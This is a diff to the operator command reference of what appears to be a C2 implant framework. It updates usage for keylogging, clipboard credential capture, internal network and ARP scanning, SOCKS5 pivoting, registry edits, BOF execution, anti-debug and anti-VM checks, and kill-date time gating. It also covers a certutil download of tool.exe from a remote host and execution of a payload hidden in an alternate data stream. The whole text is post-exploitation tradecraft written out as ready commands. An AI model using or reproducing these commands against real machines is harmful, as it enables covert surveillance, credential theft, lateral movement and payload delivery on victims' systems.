@@ -110,34 +110,37 @@ creds clipboard <id>
 
 # ─── RECON ──────────────────────────────────────────────────────────────────
 screenshot <id>
-keylog start <id> [--duration 60]
-keylog dump  <id>
-keylog stop  <id>
+keylog start <id> [--duration 60] [--wait]
+keylog dump  <id> [--wait] [--timeout 60]   # --wait default true; increase --timeout if beacon interval > 60s
+keylog stop  <id> [--wait] [--timeout 60]
 keylog clear <id>
 
 # ─── NETWORK & PIVOT ────────────────────────────────────────────────────────
-netscan  <id> --targets 192.168.1.0/24 --ports 22,80,443,3389
-arpscan  <id>
-socks5 start <id> [--addr 127.0.0.1:1080]
+netscan  <id> --targets 192.168.1.0/24 --ports 22,80,443,3389 --scan-timeout 2 --wait
+# NOTE: --scan-timeout = per-connection timeout (seconds); --timeout = operator wait timeout (default 300s)
+arpscan  <id> --wait
+socks5 start <id> [--addr 127.0.0.1:1080] --wait
 socks5 stop  <id>
 
 # ─── REGISTRY ───────────────────────────────────────────────────────────────
-registry read   <id> --hive HKLM --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName
-registry write  <id> --hive HKCU --key "Software\Test" --value MyVal --data hello --type sz
-registry delete <id> --hive HKCU --key "Software\Test" --value MyVal
-registry list   <id> --hive HKLM --key "SOFTWARE\Microsoft"
+registry read   <id> --hive HKLM --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName --wait
+registry write  <id> --hive HKCU --key "Software\Test" --value MyVal --data hello --type sz --wait
+registry delete <id> --hive HKCU --key "Software\Test" --value MyVal --wait
+registry list   <id> --hive HKLM --key "SOFTWARE\Microsoft" --wait
 
 # ─── ADVANCED ───────────────────────────────────────────────────────────────
-bof      <id> --file dir.o [--args-b64 <packed>]        # pack args: python3 pack_bof_args.py --str "..." --b64
-opsec antidebug <id>
-opsec antivm    <id>
+bof      <id> dir.o [--args-file packed_args.bin] --wait   # positional: <agent-id> <coff.o>
+opsec antidebug <id> --wait
+opsec antivm    <id> --wait
 opsec timegate  <id> --work-start 8 --work-end 18 --kill-date 2026-12-31
-lolbin fetch    <id> --url http://10.10.5.3/tool.exe --dest "C:\Temp\t.exe" --method certutil
-ads exec        <id> --ads-path "C:\legit.txt:payload.js"
+fetch    <id> http://10.10.5.3/tool.exe "C:\Temp\t.exe" --method certutil --wait
+# NOTE: command is "fetch", NOT "lolbin fetch"; takes 3 positional args: <agent-id> <url> <remote-path>
+ads exec <id> "C:\legit.txt:payload.js" --wait
+# OR: ads exec <id> --ads-path "C:\legit.txt:payload.js" --wait
 
 # ─── TEAM SERVER ────────────────────────────────────────────────────────────
 team operators
-team subscribe --name "Alice" --server http://IP:8000   # SSE stream
+team subscribe alice --server http://IP:8000              # SSE stream (positional operator name)
 team claim   <id> --session S --server http://IP:8000
 team release <id> --session S --server http://IP:8000
 ```
